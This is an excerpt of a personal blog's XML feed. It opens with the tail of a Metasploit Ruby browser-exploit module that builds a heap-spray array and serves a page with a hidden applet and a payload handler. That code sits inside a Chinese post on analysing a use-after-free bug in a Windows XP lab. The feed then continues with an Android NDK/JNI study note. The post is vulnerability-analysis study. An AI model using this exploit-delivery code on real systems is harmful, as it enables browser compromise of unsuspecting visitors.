#&#123;js_array_name&#125; = new Array()</span><br><span class="line">        for (n=0;n&lt;0x80;n++)&#123;</span><br><span class="line">          #&#123;js_array_name&#125;[n] = #&#123;js_block_name&#125; + #&#123;js_sc_name&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        JS</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    html = &lt;&lt;-HTML</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;object id="d"&gt;&lt;object&gt;</span><br><span class="line">      &lt;applet code="#&#123;js_applet_name&#125;.class" width=0 height=0&gt;&lt;/applet&gt;</span><br><span class="line">      &lt;script type="text/javascript"&gt;</span><br><span class="line">      #&#123;custom_js&#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    HTML</span><br><span class="line"></span><br><span class="line">    #Remove the extra tabs</span><br><span class="line">    html = html.gsub(/^ &#123;4&#125;/, '')</span><br><span class="line">    print_status("Sending HTML...")</span><br><span class="line">    print_status(html)</span><br><span class="line">    send_response_html(cli, html, &#123; 'Content-Type' =&gt; 'text/html' &#125;)</span><br><span class="line"></span><br><span class="line">    # Handle the payload</span><br><span class="line">    handler(cli)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>##实验环境<br>操作系统：Windows xp、<br>辅助环境: MetaSploit、Windbg</p>
<p>##准备<br>继续漏洞分析学习，上次分析了0158之后就买了泉哥的漏洞战争，很详细很nice，不用到处去找了就跟着书上流程走就可以了。</p>
<p>###样本生成<br>虽然书的配套资料有样本，但是还是按照之前的流程用MetaSploit生成了漏洞利用样本，然后用python写了个小脚本把样本存下来了（主要是ruby写的利用代码，不怎么看得懂用浏览器访问也不好存）。python脚本和漏洞样本如下<br>]]>
    
    </summary>
    
      <category term="UAF漏洞" scheme="http://www.youngroe.com/tags/UAF%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="漏洞调试" scheme="http://www.youngroe.com/tags/%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/"/>
    
      <category term="Debug" scheme="http://www.youngroe.com/categories/Debug/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android初学笔记]]></title>
    <link href="http://www.youngroe.com/2016/06/03/Learning/note-about-ndk-md/"/>
    <id>http://www.youngroe.com/2016/06/03/Learning/note-about-ndk-md/</id>
    <published>2016-06-03T08:54:33.000Z</published>
    <updated>2020-02-15T07:54:24.202Z</updated>
    <content type="html"><![CDATA[<p>参考资料:<br>1.<a href="http://jp1017.github.io/2016/03/23/%E5%AE%89%E5%8D%93-jni-%E5%BC%80%E5%8F%91%E4%B9%8B-native-%E6%96%B9%E6%B3%95%E7%9A%84%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C/" target="_blank" rel="external">安卓 jni 开发之native方法的动态注册</a><br>2.<a href="https://github.com/googlesamples/android-ndk" target="_blank" rel="external">android-ndk</a><br>3.<a href="http://landerlyoung.github.io/blog/2014/10/16/java-zhong-jnide-shi-yong/" target="_blank" rel="external">Java中JNI的使用</a><br>4.<a href="http://blog.csdn.net/yyh352091626/article/details/50542554" target="_blank" rel="external">Android 通过JNI实现守护进程，使Service服务不被杀死</a><br>5.<a href="http://www.cnblogs.com/skywang12345/category/482610.html" target="_blank" rel="external">Android JNI和NDK学习</a><br>6.<a href="http://blog.csdn.net/yy1300326388/article/details/46422939" target="_blank" rel="external">［Android Studio 权威教程］AS添加第三方库的6种方式（Jar,module,so等）</a></p>
<h2 id="helloWord">helloWord</h2><p>最近刚好有点时间想学习下Android，ndk要使用一下c语言，就从最熟悉的开始吧,这里简单记录下。网上的例子比较多，都写得比较详细。先来个helloworld吧<a href="http://blog.csdn.net/sbsujjbcy/article/details/48469569" target="_blank" rel="external">Android Studio使用新的Gradle构建工具配置NDK环境</a><a href="http://yanbober.github.io/2015/02/14/android_studio_jni_1/" target="_blank" rel="external">NDK-JNI实战教程（一） 在Android Studio运行第一个NDK程序</a>，基本按照这两篇教程来，中间有什么问题google一下记住一定用google哦。<br>中间可能需要注意的地方</p>
<ul>
<li>包不完整各种报错，更新你的Android SDK吧貌似现在没有被墙</li>
<li>javah 命令执行不成功，命令执行路径不正确或则你没有make没生成class文件</li>
<li>helloword直接崩溃，开logcat error UnsatisfiedLinkError: Native method not found 相信你肯定是写错了，多看看网上的错误分析 仔细检查下</li>
</ul>
<a id="more"></a>
<h2 id="动态注册">动态注册</h2><p>HelloWord中使用的是静态注册的方式，感觉有点死板，java还给我们提供了另外一种方式，正好看见了一个例子<a href="http://blog.csdn.net/yyh352091626/article/details/50542554" target="_blank" rel="external">Android 通过JNI实现守护进程，使Service服务不被杀死</a>尝试加到HelloWord中。中间各种问题，幸好之前用vs比较熟悉有一点点基础，哈哈。</p>
<p>主要问题：</p>
<ul>
<li>编译不过， 使用了__android_log_print 需要在build.gradle中 加ldLibs “log”</li>
<li>各种失败，主要问题是对Android不熟悉 AndroidManifest.xml 中没申请各种权限没注册services</li>
<li>Native method not found，主要是java方法签名不熟悉 写错了导致RegisterNatives失败，推荐方法比较多不熟悉java的人使用javap -s -p命令生成</li>
</ul>
<h2 id="后续学习">后续学习</h2><ul>
<li>apk动态调试，<a href="http://drops.wooyun.org/mobile/5942" target="_blank" rel="external">安卓APP动态调试-IDA实用攻略</a>,<a href="http://drops.wooyun.org/author/%E8%92%B8%E7%B1%B3" target="_blank" rel="external">蒸米安卓动态调试七种武器</a>，<a href="http://drops.wooyun.org/author/%E7%98%A6%E8%9B%9F%E8%88%9E" target="_blank" rel="external">乌云drops瘦蛟舞</a></li>
<li>java语言，主要是进程线程异常处理这块</li>
<li>Android系统，Android揉合了linux、java、c/c++及Android自身很多东西 还需要学习的东西很多</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>参考资料:<br>1.<a href="http://jp1017.github.io/2016/03/23/%E5%AE%89%E5%8D%93-jni-%E5%BC%80%E5%8F%91%E4%B9%8B-native-%E6%96%B9%E6%B3%95%E7%9A%84%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C/">安卓 jni 开发之native方法的动态注册</a><br>2.<a href="https://github.com/googlesamples/android-ndk">android-ndk</a><br>3.<a href="http://landerlyoung.github.io/blog/2014/10/16/java-zhong-jnide-shi-yong/">Java中JNI的使用</a><br>4.<a href="http://blog.csdn.net/yyh352091626/article/details/50542554">Android 通过JNI实现守护进程，使Service服务不被杀死</a><br>5.<a href="http://www.cnblogs.com/skywang12345/category/482610.html">Android JNI和NDK学习</a><br>6.<a href="http://blog.csdn.net/yy1300326388/article/details/46422939">［Android Studio 权威教程］AS添加第三方库的6种方式（Jar,module,so等）</a></p>
<h2 id="helloWord">helloWord</h2><p>最近刚好有点时间想学习下Android，ndk要使用一下c语言，就从最熟悉的开始吧,这里简单记录下。网上的例子比较多，都写得比较详细。先来个helloworld吧<a href="http://blog.csdn.net/sbsujjbcy/article/details/48469569">Android Studio使用新的Gradle构建工具配置NDK环境</a><a href="http://yanbober.github.io/2015/02/14/android_studio_jni_1/">NDK-JNI实战教程（一） 在Android Studio运行第一个NDK程序</a>，基本按照这两篇教程来，中间有什么问题google一下记住一定用google哦。<br>中间可能需要注意的地方</p>
<ul>
<li>包不完整各种报错，更新你的Android SDK吧貌似现在没有被墙</li>
<li>javah 命令执行不成功，命令执行路径不正确或则你没有make没生成class文件</li>
<li>helloword直接崩溃，开logcat error UnsatisfiedLinkError: Native method not found 相信你肯定是写错了，多看看网上的错误分析 仔细检查下</li>
</ul>]]>
    
    </summary>
    
      <category term="android" scheme="http://www.youngroe.com/tags/android/"/>
    
      <category term="ndk" scheme="http://www.youngroe.com/tags/ndk/"/>
    
      <category term="Learning" scheme="http://www.youngroe.com/categories/Learning/"/>
    
  </entry>
  
</feed>